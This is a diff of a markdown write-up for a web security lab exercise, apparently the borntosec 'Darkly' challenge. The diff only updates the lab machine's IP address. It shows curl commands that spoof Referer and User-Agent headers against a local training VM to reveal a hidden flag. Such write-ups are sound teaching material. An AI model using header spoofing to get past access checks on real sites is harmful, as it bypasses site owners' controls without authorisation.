@@ -1,6 +1,6 @@
 # Fake headers
 
-__http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f__
+__http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f__
 
 ## Description
 There are a lot of comments in the html. One of them is 
@@ -14,8 +14,8 @@ You must come from : "https://www.nsa.gov/".
 Let's try to request
 
 ```
-curl http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -s -o nohead.html
-curl http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -H "Referer: https://www.nsa.gov/" -s -o head.html
+curl http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -s -o nohead.html
+curl http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f -H "Referer: https://www.nsa.gov/" -s -o head.html
 diff nohead.html head.html 
 ```
 We get the following rows
@@ -36,13 +36,13 @@ Let's use this browser : "ft_bornToSec". It will help you a lot.
 ```
 We see ft_bornToSec header. We can use that for header
 ```
-curl -s 'http://192.168.99.101/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o webmaster.html
-curl -s 'http://192.168.99.101/?page=recover' --data 'mail=krasty%40lnoisome.com&Submit=Submit' -o krasty.html
+curl -s 'http://192.168.56.101/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o webmaster.html
+curl -s 'http://192.168.56.101/?page=recover' --data 'mail=krasty%40lnoisome.com&Submit=Submit' -o krasty.html
 diff webmaster.html krasty.html 
 ```
 Inside the diff output html we get the flag
 ```
-curl 'http://192.168.99.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o head.html
+curl 'http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" -s -o head.html
 diff nohead.html head.html | grep flag
 ```
 The output is with the flag
